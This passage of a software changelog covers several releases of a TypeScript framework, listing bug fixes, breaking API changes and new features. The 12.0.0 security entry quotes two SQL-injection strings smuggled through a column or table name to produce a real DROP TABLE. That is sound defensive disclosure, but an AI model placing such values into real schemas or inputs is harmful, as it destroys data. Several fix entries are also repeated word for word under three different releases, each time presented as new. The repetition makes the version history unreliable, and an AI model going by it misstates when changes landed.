- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **BREAKING — a frame verb acted on the parent document.** `frameTarget` spread the parent target
  and `clear` was missed when the overrides were added. On CDP, `frame.fill()` cleared the
  **parent's** same-id field and then **appended** to the frame's, so a remembered username
  submitted as `oldUserNEWUSER` while a parent field was silently emptied. On the offline drivers
  one shared overlay meant `page.values('#password')` read back what was typed into the frame.
  `driver-parity.test.ts` exists to catch a CDP/offline divergence and had no frame coverage;
  `driver-parity-frames.test.ts` now does.
- **BREAKING — two tenants could share one authenticated session.** `sessionKeyFor` collapsed every
  non-`[a-zA-Z0-9._-]` run to a single `-`, so `alice@corp.com` and `alice-corp.com` were one key.
  The browser then loaded account A's cookies, `auth.validate()` answered `true` — the session *is*
  valid, for the wrong account — and A's rows were stored under B's tenant. Each segment now
  carries a hash of its raw value. **Every stored session key changes spelling**: a miss reads as
  "no session", so it costs one extra login per stored session and orphans the old objects.
- **A schema refusal burned a job's whole retry policy.** `classifyThrown` reports the fail-closed
  default only for a code that was *explicitly declared*, so `X_VALIDATION_FAILED` — unclassified —
  let the attempt count govern. Measured: a page carrying `<div constructor="…">` cost
  `@ultimat3/scraping` five browser launches, five arrivals at a login, and a dead letter claiming
  the browser went away, about a browser that answered perfectly.
- **`X_FORBIDDEN` was unclassified too**, so a job retried an authz denial five times.
- A site's response body reached an error `cause` unredacted, and `secrets.ts`'s header promised
  otherwise. `page.console()`, `page.network()` and `page.pageErrors()` were unredacted as well —
  three of the four surfaces that header named, plus a fifth it did not.
- `createRing` with a negative capacity **hung forever** — past `ctx.signal`, past the wedge
  watchdog and past the job timeout. Reproduced at `exit 124`.
- A recorded 204 could not be replayed: `t.string` refuses an empty string, so `body: ''`,
  `html: ''` and an empty header value all raised `X_VALIDATION_FAILED`, and the two offline
  drivers disagreed about the same recording.

### Changed

- **BREAKING — `$migration()` is removed from `EntityCore`**, and `toSql`, `invariantsToSql` and
  `constraintName` are removed from `@ultimat3/entity`'s public API. They were a **second** renderer
  of the same CHECK and UNIQUE statements `@ultimat3/db` emits, under the same naming convention,
  called by nothing but tests — and `$migration()` passed the entity NAME where the renderer expects
  the TABLE, so `entity('account', { table: 'legacy_accounts' })` produced
  `ALTER TABLE "account" …`: a `42P01` against a relation that does not exist, under a constraint
  name no migration writes.

  Two tests were pinning it. `physical-names.test.ts` — whose own header says *"the second place
  that spells a name is the one that gets it wrong"* — checked the **column** half of the renderer
  that got the **table** half wrong, on the one entity in the repo that could have shown it. And
  `dsl.test.ts` asserted `$migration()` passes `$name`, making the bug the definition of correct
  delegation. `x db gen` is the one path to a constraint, and it was always correct.

- **BREAKING — `t.number.int()` demands a SAFE integer.** It used `Number.isInteger`, so
  `9007199254740992` passed the boundary as a 200 and failed at the row write as a 500 — the same
  value refused twice, once with a field path and once without. `money-value.ts`, one file over,
  already carried the write-up for having fixed exactly this. `toJsonSchema` now publishes the safe
  range on an integer node, so the contract stops promising what the parser refuses.
- **BREAKING — `and()` and `or()` refuse an empty clause list.** `and()` answered **allowed** and
  `admitsAnonymous(and())` agreed, so a policy built from a list that filtered to empty admitted an
  anonymous caller on all four surfaces.
- **BREAKING — a `t.record` issue path names the failing entry by POSITION**, not by the caller's
  key. The key *is* caller data, and it reached `X_BODY_INVALID`'s cause and the log line —
  the surface `describe-value.ts` exists to keep caller content out of.
- **BREAKING — `ScrapeTarget.setOfflineMode` is required** and `CdpTargetInit.ringCapacity` is
  deleted (declared, exported, read, and passed by nothing but a test).
- **BREAKING — `Repo.insert`/`insertAll`/`upsertAll` take `RowWrite<T>`.** They took the ROW type
  where money's WRITE type belongs, so `postgresRepo()` — exported — was a compile error for a
  `bigint` minor the framework documents, implements and stores correctly. Measured while fixing
  it: `Bun.SQL` hands `int8` back as a **string**, never a `bigint`, so the runtime was right in
  both directions and only the declaration was wrong.
- An `or` denying an anonymous caller reports `X_UNAUTHENTICATED` where it reported `X_FORBIDDEN`.

### Commits

- fix(db,render,cli): a column's CHECK left the database, and the first click was lost (#352)
- fix: the gaps 13.0.0 left, and the three packages that release never opened (#351)

## 13.0.0 - 2026-08-25

Six capabilities the readiness register graded **Ship**, all of them, plus the defects found while
building them — which were worse than the gaps. Every one is a factory over an existing primitive:
no ninth primitive, no new `PrimitiveKind`, and `PRIMITIVE_FACTORIES` grew by three rows.

`@ultimat3/notify` is the framework's **31st package** and its first new one since `scraping`.

### Added

- **Notifications — `notifier()`, a job factory in the new `@ultimat3/notify` (tier 4).** One
  declaration, many channels: fan-out, a preference gate, a digest window, a delivery ledger and an
  in-app inbox. Inspired by Rails' `noticed` and translated rather than copied — params are a
  **schema** (which is how every primitive here declares input, and what earns the manifest row),
  and the unit of retry is a durable **step** per (recipient × channel) rather than `noticed`'s
  queue row per pair, because `step.run` already *is* the retry unit. Ultimate goes further than
  `noticed` on the two the register demanded: `noticed` has no preference storage at all and no
  digest coalescing. The notification **taxonomy** and `quietHours` deliberately never ship — the
  framework ships the gate, the app declares what the gate reads.
- **Full-text search — `searchable()` on a text column, `search()` as a query factory.** One
  `tsvector` per entity, so one GIN index and one predicate, with per-source weights `A`–`D`.
  `websearch_to_tsquery`, never bare `to_tsquery` — which reads a user's `&`, `|`, `!`, `:*` and
  parens as **operators** — and never `plainto_tsquery`, which silently discards `"a phrase"` and
  `-negation`. Paging is by the entity's declared total order: relevance ordering needs `ts_rank`
  as a seekable key across four files, and shipping `order by ts_rank` without the cursor half is
  exactly the pager 12.0.0 fixed.
- **`generated always as (…) stored` reaches the migration.** `x db gen` could not emit a generated
  column at all, which is what the search vector needs. An expression that moves is
  `alter column … set expression as (…)` (Postgres 17+, which is the shipped floor everywhere):
  it rewrites the table, recomputes every row and **keeps the column's indexes** — measured.
  Drop-and-recreate loses the GIN index, and nothing in the diff puts it back.
- **Outbound webhooks — `webhook()`, a job factory — and `verifyWebhookSignature()` inbound.**
  One canonical string, `v1:<timestamp>:<eventId>:<topic>:<body>`, HMAC-SHA256, in
  `@ultimat3/core` so the signer and the verifier are one function rather than two that agree
  today. **`:` is refused in an id or a topic on both sides**: without that, one MAC over
  `v1:t:evt:01HZ:orders.paid:<body>` authenticates **two** different id/topic splits — the
  sender's own signature under a label it never wrote.
- **Async export — `exportRows()`, a job factory.** A paged read streamed to object storage with a
  resumable cursor, ndjson or RFC-4180 csv. **The part key is the page index**, so a replayed page
  rewrites the same object with the same bytes and a duplicate row in the artifact is not
  expressible. The csv formula guard (a cell leading `=`/`+`/`-`/`@`/TAB/CR is *evaluated* by
  Excel, Sheets and LibreOffice) is on strings only, so a negative number stays a number.
- **State machines — `enumerated().transitions()`, and `transition()` as a mutator factory.** The
  legality check is in the statement's predicate, not around it: **twenty concurrent transitions at
  one row produced 14 winners with a read-then-check-then-write and 1 with `from` in the
  predicate.** `TransitionTable<S>` is a mapped type over the app's own union, so there is no enum
  of state names anywhere in the framework and an unknown target is a compile error.
- **Form binding — `useForm()` in `@ultimat3/ui`**, mapping an action's validation issues back to
  the field that caused them, `items[2].price` included. Server authority is structural: `submit`
  is a required option and `succeeded` is constructed at exactly one site from its resolved value,
  so the local parse's result is never read.
- **`bun run framework-tables`** — a gate ratchet refusing a literal `create table` in
  `packages/*/src` that no boot path creates. Pinned at zero, enforcing outright.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`defineService` was a job-and-CLI feature, and nothing said so.** An app that registered
  `defineService('posts', …)` got that service in a job, a task and a CLI command and **nowhere
  else**: `@ultimat3/http` built its own service bag and never called core's `installedServices()`.
  So on the surface an app spends its life on, `ctx.services` was `{}` and `useService('posts')`
  threw `X_SERVICE_MISSING` for a service that was registered and working one process over. The
  second half compounded it — core's `createContext` spreads the bag **onto** the context, so
  `ctx.posts` *is* the service, and http never did. `ctx.posts` is the spelling
  `docs/architecture/15-adding-a-feature.md` writes in its worked example, so **the documented path
  was the broken one**. `createRequestContext` now composes `createContext()` instead of building a
  second context beside it, so both halves are fixed at once and cannot drift again.
  **`defineService` factories now run once per HTTP request**, which they never did.
- **Five auth tables were created by nothing.** `x_users`, `x_sessions`, `x_accounts`,
  `x_verifications` and `x_api_keys` — the five `BuiltinAdapter` reads — were declared, exported
  and applied by **no boot path, in dev or in production, from the initial commit through all 21
  released versions.** They are not `entity()` declarations, so `x db gen` never saw them, and the
  file exported the DDL "so an app can paste it into a migration" that no app wrote.
  `examples/dummy/CLAUDE.md` recorded the consequence in the app's own words — nobody could hold a
  session — without anyone connecting it to the cause. Now in `FRAMEWORK_SCHEMA`, and
  `bun run framework-tables` is what keeps the class closed.
- **Two error codes were unreachable by any caller.** `X_TEST_SCHEMA_EXPECTED` and
  `X_TEST_JOB_EXPECTED` were declared, registered and titled, and Bun **replaces** an error thrown
  from an `async` matcher body with its own `returned a promise that rejected`. The three matchers
  are no longer `async`.
- **Per-field validation issues now survive the wire.** `InputInvalidError` flattened the issue
  list to one string and put nothing in `meta`; `ProblemDocument` had no `issues` member; the typed
  client reconstructed only `code`/`cause`/`fix`/`docs`. So the only carrier of per-field
  information was the prose `cause` line, and every app writing forms parsed it. The list is now
  carried end to end — action → http → mcp → client → form — **dropped under exactly the opacity
  condition** an unclassified 5xx already uses, bounded, and rebuilt member by member with
  `received` forced empty, because a foreign schema library's raw issue object may carry the value
  that was rejected.
- **A phantom write chain in the reference app.** `setPlan` and `updatePreferences` were
  `.where({id}).update({…}).returning()` — `ReadBuilder` has no `update`, and nothing in
  `@ultimat3/entity` has `returning`. Both were `TypeError`s on every call; nothing had ever
  exercised the server half of a preference write. `examples/dummy`'s typecheck went 116 → 0.
- **Nine e2e assertions used a matcher that does not exist.** `toBeVisible` was not among
  `UltimateMatchers`' seven. It exists now and genuinely retries — a budget counted in
  **observations, not milliseconds**, because this package freezes `Date.now()` and a clock
  deadline never expires, turning a failing test into a hanging one.
- **Two notify codes burned the whole retry policy.** `X_NOTIFY_FANOUT_TOO_WIDE` and
  `X_NOTIFY_STORE_MISSING` are thrown inside a job body and were never classified, so an audience
  over the cap and a missing store each re-proved an answer no attempt could change. Both are
  `terminal`; `X_NOTIFY_DELIVERY_FAILED` is `retryable` and **502, not 500** — it wraps a
  provider's rejection, and every `status >= 500` is reported to the error monitor, so a wrong 500
  pages the on-call for someone else's outage.

### Changed

- `x db gen` emits `generated always as (…) stored`; `ColumnDescription` carries `generated`.
- `enumerated()` returns `EnumeratedColumn<V>` rather than `Column<V[number]>` — structurally
  widening, assignable everywhere the old type was.
- **BREAKING — `ServiceFactory` receives `CtxFacts` rather than `Ctx`.** A factory reading a
  sibling service no longer typechecks. Reading one was already documented as unsupported and no
  app in the tree does it, but the type permitted it and now does not, which is a compile error
  where there was none.
- **BREAKING — `PageLike.content()` is deleted.** Its comment claimed every member was one the
  reference app's e2e suite already calls; that was false for three of eleven, and `content()` had
  **zero call sites anywhere in the repository**. `title()` and `reload()` stay, with the caveat
  recorded: their only caller is a generated template that nothing executes.

### Commits

- feat(scripts,testing,docs): the defects found building 13.0.0, and the rules that keep them closed (#350)
- feat(jobs,action,notify,ui,mcp,cli): notifications, webhooks, exports, form binding (#349)
- feat(core,http,db,entity,query): the request-context repair, full-text search, and state machines (#348)

## 12.0.0 - 2026-08-24

One sweep, in the two halves every major here has had: things **declared and never wired** are wired
or deleted, and things that **answered the wrong thing** are corrected. The declared-and-never-wired
half is now mechanised a second time — `scripts/declaration-readers.ts` ratchets every leaf key of
every primitive declaration, where `scripts/config-readers.ts` only ever saw `AppConfig`.

### Security

- **BREAKING — every physical name is asserted at `entity()`: `[a-z_][a-z0-9_$]*`, at most 63 bytes.**
  `columnName` is `meta.name ?? snake(property)`
  and only the FIRST branch was validated, so a column declared
  `n" , "x" text); drop table t; --` produced a `create table` carrying a real `drop table` —
  measured through `generateMigration`, not theorised. `entity('t" (x int); drop table u; --')` did
  the same through the table-name fallback. Both are asserted at declaration now
  (`packages/entity/src/column.ts`, `entity.ts`). Found while testing an unrelated index-name guard.

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **Keyset pagination silently dropped rows.** The seek treated a whole millisecond as one equality
  class while `ORDER BY` evaluated `timestamptz` at microsecond precision — two different equality
  classes over one page boundary. Reproduced against Postgres 16: three rows inside one millisecond,
  uuid-v7 ids, `orderBy('createdAt','desc').limit(1)` — the walk returned **1 of 3 rows and stopped**.
  Under `desc` with time-ordered ids the boundary row always holds the largest id in its millisecond,
  so every remaining row in it was dropped, every time. Invisible to the whole parity suite by
  construction: `memoryRepo` stores millisecond `Date`s, and the pg tests asserted SQL *text* against
  a recording client. The cursor now carries microseconds and the seek is a plain comparison;
  `nextMillisecond` is gone.
- **A nullable sort key was refused only when a next page existed** — green on 15 seeded rows,
  `X_INVARIANT_VIOLATED` on the first real read in production. The check moved to plan time, and then
  the refusal itself was mostly deleted: see Added.
- **Two partial indexes on the same columns silently collapsed to one.** An index's identity was its
  name and the name omitted `where` and `order`, so the second declaration was dropped with no error,
  no warning and no drift finding.
- **Extension-owned relations failed every deploy** (#340). A stock managed Postgres with
  `pg_stat_statements` in `public` made `x db migrate`'s drift audit refuse terminally, and the
  printed fix (`x db gen "add pg_stat_statements"`) asked the app to own an extension's view.
  Introspection now excludes relations Postgres records as extension-owned (`pg_depend`,
  `deptype = 'e'`) — ownership, not a name prefix, because an extension may install any name.
- **The MCP argument validator counted UTF-16 code units** while the schema that minted and publishes
  those numbers counts code points. An astral-character argument was silently passed and then refused
  by the action's own parse, or refused outright on a bound the agent had obeyed.
- **No HTTP request ever spent an org rate-limit bucket.** The key builder consulted `orgId` only when
  `actorId` was null, and the anonymous actor answers `null` for both — so the branch was unreachable.
- **`x new` scaffolded an app that served HTTP 500 on two of its three routes.** The template granted
  `dashboard:read` and required it on a route, and nothing called `definePermissions`. A green
  19-step gate said nothing, because the scaffold's own test asserted role *expansion* and never
  registry *membership*.
- **`x i18n add <locale>` wrote a file that turned the gate red, printing a fix that repaired
  nothing** — it named an edit already made by `x new`, so an agent following it changed nothing and
  stayed red.
- **`x dev --port N` died on port N+1** with a caught `Error` rendered into the cause, `X_CLI_UNEXPECTED`
  rather than a stable code, and `x doctor` answering "shippable" because it probed only the web port.
  `x doctor` now probes both ports and the database.
- **The gate's own verdict depended on machine load** — three `scripts/side-effects.test.ts` cases each
  re-scanned every file of every package and timed out at 5000ms under `x verify`'s workers.

### Added

- **Read replicas.** `DATABASE_REPLICA_URL`, `withReplicaReads(fn)`, and read-your-writes as the rule
  rather than an option: any write, or any `withTransaction` that is not `readOnly`, pins the rest of
  the scope to the primary. A 3-failure/10s breaker falls back to the primary. Opt-in and byte-identical
  when unconfigured. The boot installs both halves — until it did, `DATABASE_REPLICA_URL` was read by
  no process at all.
- **A durable admin audit sink.** `postgresAuditSink({ executor })`, append-only, no purge (retention
  is the app's). `memoryAuditSink` is now a bounded ring that reports `dropped`, rather than an
  unbounded array retaining a whole `Ctx` per record. The sink never walks the `Ctx` — a fixed
  allow-list — and redacts `input` through core's own `isRedactedKey`.
- **`configureHttp()`.** The entire HTTP tuning surface — CORS origins, body limit, request timeout,
  max in-flight, rate-limit buckets — was reachable from no app config key that existed. `DEFAULT_CORS.origins`
  is `[]`, so every cross-origin browser call was refused in every deployment, permanently, with nowhere
  to say otherwise.
- **Per-tenant HTTP rate limits.** A request spends a list of keys; `rateLimit.tenantBucket` caps an org.
- **The request deadline propagates.** `traceHeaders()` sends the *remaining* budget, so a downstream
  hop cannot start a fresh full budget after its caller has already been answered `X_TIMEOUT`.
- **Aggregates and containment on entities.** `sum`/`avg`/`min`/`max`/`approximateCount`, and
  `contains`/`contained-by`/`overlaps`/`has-key` so a declared `json()` or `arrayOf()` column is no
  longer write-only from the query language. `min`/`max` on text is refused (Postgres orders by
  collation, JS by code unit); `avg` over money is refused, naming `sum()` + `count()`.
- **Nullable sort keys order.** `asc nulls last` / `desc nulls first`, with the null position encoded in
  the cursor. Only a nullable primary-key column is still refused.
- **`scripts/declaration-readers.ts`** — every leaf key of every primitive declaration needs a reader.
  173 leaves across 18 roots, pinned at zero.
- **A `policy` gate step**, twentieth. It is what would have caught the scaffold's 500s.
- **MCP rate limits are enforced.** `MCP_RATE_LIMITS` was published on the descriptor and applied by
  nobody; the real ceiling was Bun's accept rate.

### Removed

- **BREAKING — `LiveCursor.digest` and `LiveCursor.count`, `digestOf`, `DIGEST_UNVERIFIED` and `fnv1a`
  are deleted from `@ultimat3/realtime`.** Every snapshot ran `canonicalJson` over every row and hashed it for a value
  no code path read — in the reconnect storm this package is benchmarked on, that is a full
  serialize-and-hash of every result set for nothing. `PROTOCOL_VERSION` moves 1 → 2: the fields were
  decoded through `str()`/`num()`, which throw on absence, so removal is unreadable in both directions
  and a version bump is what says so.
- **BREAKING — `RouteBudget.css`, `.cls` and `.tbt` are deleted.** Declared on the route contract, projected by nothing, so
  a declared CSS budget was silently ignored while `budgets` reported green. A type pin now makes a new
  budget key a build error until it is projected.
- **The four `doc-config-key-pins.ts` waivers.** That table said the repair "is a release decision, not
  an edit to the four rows below". This is that decision; the table is empty.

### Changed

- **BREAKING — `claim({ queues: [] })` is refused** rather than meaning "every queue" on the memory
  driver and "the default queue" on Postgres. Each meaning is silently wrong in the other's
  deployment. `X_JOB_CLAIM_QUEUES_EMPTY`. The memory driver's `claim` is `async` to raise it, so a
  caller that read its return synchronously now gets a `Promise`.
- **BREAKING — the primary-key tiebreak takes the last declared key's direction**, so the default total order is
  no longer mixed-direction and therefore un-indexable by this framework's own index DSL. A uniform
  order is emitted as a row comparison — measured on PG16: `Index Only Scan`, against `BitmapOr` + `Sort`
  for the or-chain.
- **BREAKING — every cursor minted before 12.0.0 is `X_CURSOR_INVALID`.** A `timestamp()` sort key is
  carried as a microsecond epoch rather than an ISO string, and every entry is tagged — `~` for an
  absent value, `!` before a present one, so a `text` column holding the four characters `null` can
  never be read as an absence. Both are what let the seek be a plain `<` / `>` / `=` against
  `$n::timestamptz` instead of the `>= v and < v + 1ms` window that dropped rows. A read ordered by a
  `timestamp()` column also carries one extra output column on the wire, `"<col>$US"` — under a name
  no entity can declare, stripped by `decodeRow`, and visible only to a test asserting SQL text.
- **BREAKING — an index that declares `where` or `order` is named
  `<table>_<cols>_<hash8>_idx`.** Plain and `unique()` names are unchanged, because those are
  load-bearing: Postgres names a column-level `unique()` index `<table>_<column>_key` itself, and a
  foreign key's own index is deduped against a hand-declared one by that name. The discriminator is
  what stops two different partial indexes on one column from being one name and one index. A name
  over 63 bytes is now refused at declaration rather than truncated by the server in silence.
- **BREAKING — `Repo` gains `aggregate(fn, column, args?)` and `approximateCount(args?)`, and
  `ReadBuilder` gains `sum`, `avg`, `min`, `max` and `approximateCount`.** A hand-rolled `Repo` or
  `Driver` no longer satisfies the interface.
- **BREAKING — `Operator` gains `contains`, `contained-by`, `overlaps` and `has-key`.** An exhaustive
  `switch` over it stops compiling until it widens.
- **BREAKING — `introspect()` returns app tables only.** Views, materialised views, foreign tables
  and every relation Postgres records as extension-owned are excluded before the fold, and
  `IntrospectOptions.exclude` no longer decides the set on its own. It issues four catalog queries
  where it issued three.
- **BREAKING — `rateLimitKey` is deleted; `rateLimitSpends` replaces it**, because one request now
  spends a LIST of keys — the caller's, then the tenant's — where the old builder answered `actor`
  else `org` else `ip`, exclusively, and so never reached an org bucket at all.
  `RateLimitConfig.tenantBucket` is a required member of the resolved config.
- **BREAKING — `Ctx` gains a required `deadlineAt: number | null`.** A hand-written `Ctx` — a test
  fixture, a custom host — no longer compiles. `createContext` defaults it to `null`.
- **BREAKING — `traceHeaders()` sends the remaining request budget**, so a downstream hop is given
  what is LEFT of its caller's deadline rather than a fresh one. A spent budget sends no header at
  all rather than `0`, which the far side would read as "the caller asked for nothing".
- **BREAKING — `mcpHttpRoute` and `defineAppMcp` enforce `MCP_RATE_LIMITS`** — 120 read and 20 write
  per minute per actor, `X_MCP_RATE_LIMITED` with a `Retry-After` past it. The numbers were published
  on the descriptor and applied by nobody, so the real ceiling was Bun's accept rate.
- **BREAKING — `memoryAuditSink()` is a bounded ring that discards**, `DEFAULT_MAX_AUDIT_RECORDS`
  (1,000) oldest-first, with `{ maxRecords }` to raise it. `MemoryAuditSink` gains required `size` and
  `dropped`, so a hand-written implementer no longer compiles.
- **BREAKING — `DoctorProbe` gains a required `database()`**, and `portFree` is called for two ports:
  `x doctor` answered "shippable" while probing only the web port and never the database.
- **`@ultimat3/schema` exports `charCount`**; `@ultimat3/mcp` now depends on `@ultimat3/http`.

### Commits

- feat: 12.0.0 — batteries for scale, and the gaps mechanised shut (#347)
- fix(db): extension-owned relations, read replicas, and index access methods (#340) (#346)

## 11.3.0 - 2026-08-24

### Fixed

- **`x shot` could not find an installed Chrome, though the framework already knew how.**
  `cdp-launch.ts` has exported `CHROME_CANDIDATES` and `findChrome()` since the e2e driver needed
  them; `x shot`'s own resolver never touched the filesystem, reading only `--browser`,
  `PUPPETEER_EXECUTABLE_PATH` and `CHROME_PATH`. Measured: with Chrome at `/usr/bin/google-chrome`,
  `x shot /` failed until `--browser` was passed by hand. The resolver now falls back to the probe
  that already existed, and the refusal happens **before** the dev server boots — `cmd-shot.ts`
  started a full embedded Postgres and then reported the wrong instruction. The old `fix:` line
  said `bun add -d puppeteer-core`, which is true about the library and silent about the browser:
  following it literally walked into ``An `executablePath` or `channel` must be specified``.

- **A missing browser binary was retried five times as though the host were down.**
  `X_SCRAPE_BROWSER_UNREACHABLE` wrapped every launch throw and was registered retryable, with a
  fix line about `watchdog: { idleMs }` on a `scrape()` definition that does not exist on the
  `x shot` path. A permanent misconfiguration is now told apart from a genuinely unreachable host;
  only the second stays retryable.

- **`X_MANIFEST_BREAKING` named a config field that does not exist.** Its fix said "bump the major
  version in `app.config.ts`" — `AppConfig` has no `version` member and `defineConfig`
  excess-property-checks its literal, so following the instruction literally fails typecheck. The
  version is read from `package.json`. The same wrong file was repeated in `packages/manifest`'s
  README and schema. The message also rendered `from 0.1.0 to 0.1.0`, which is the *guaranteed*
  first-fire shape rather than an anomaly — the drift gate forces both sides equal in any green
  state — and demanded `1.0.0` from an app `x new` had just scaffolded at `0.1.0` with no
  published clients. All three are reworded; the comparison itself is unchanged.

- **The screen-reader live region tripped an app's own CSP on every page load.**
  `@ultimat3/ui`'s `announce()` assigned `region.style.cssText`, and a style applied by script is
  not among the inline hashes the framework's own CSP computes at render time. Reproduced in a
  clean headless Chrome with no extensions: `Applying inline style violates the following Content
  Security Policy directive 'style-src …'`, report-only, on every load. The region now carries a
  class hidden by the `visually-hidden` mixin `packages/ui` already ships — no second copy of the
  recipe, no widened CSP — and gains the `inset-inline-start: 0` and `padding: 0` the old string
  lacked, which is the document-widening bug `_mixins.scss`'s own header documents.

- **A scaffolded app's coverage report carried a phantom file.** `bun test --coverage` listed the
  built island chunk as a 2-line minified temp `.mjs` and never the island's source. Measured on
  Bun 1.4.0: coverage does not remap a pre-built module through its sourcemap, so this is not
  fixable with sourcemap settings — `island-bundle.ts` already emits one. `x new`'s bunfig now
  ignores `**/*.mjs`, which removes the phantom. Making island *source* visible needs a separate
  seam and is not in this release.

- **A `Record` literal read with a computed key, in the CLI's own verify step table.**
  `SUMMARIES[type]` in `verify-tests.ts` answered an `Object.prototype` member for any key nobody
  declared. `type` is a closed union and cannot be `'constructor'` today, which is the argument
  every one of the thirteen instances `scripts/proto-index.ts` was written for had, before it
  stopped being true. Null-prototyped, the same repair as `packages/i18n/src/catalog.ts`.

- **`llm()`'s semantic cache answered in the wrong language.** Reported against the reference app:
  the summary comes back in Spanish for an English reader. The model was never wrong — it is told
  `Write the summary in the locale {{locale}}` and it obeys. The cache was: `lookup` is a cosine
